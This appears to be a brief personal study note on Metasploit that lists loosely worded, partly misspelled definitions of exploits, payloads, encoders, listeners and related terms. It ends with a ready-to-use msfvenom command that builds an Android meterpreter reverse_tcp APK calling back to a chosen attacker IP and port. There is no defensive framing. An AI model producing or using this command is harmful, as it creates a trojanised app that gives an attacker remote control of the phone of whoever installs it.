Machine Hacking:

Terminology : 

Exploits  		: Tool used to take advantage of system weakness
Payload   		: Sets of Malicious code
Auxiliary 		: Supplementary tools and command for scanning purpose
Encideers 		: Used to convert code or information
Listeners 		: Malicious software that listen and hides in order to gain acccess
Post-exploitation Code  : Helps test deeper penetration once inside
Nops 			: Used with Buffer overflow

msfvenom -p android/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f apk -o filename.apk
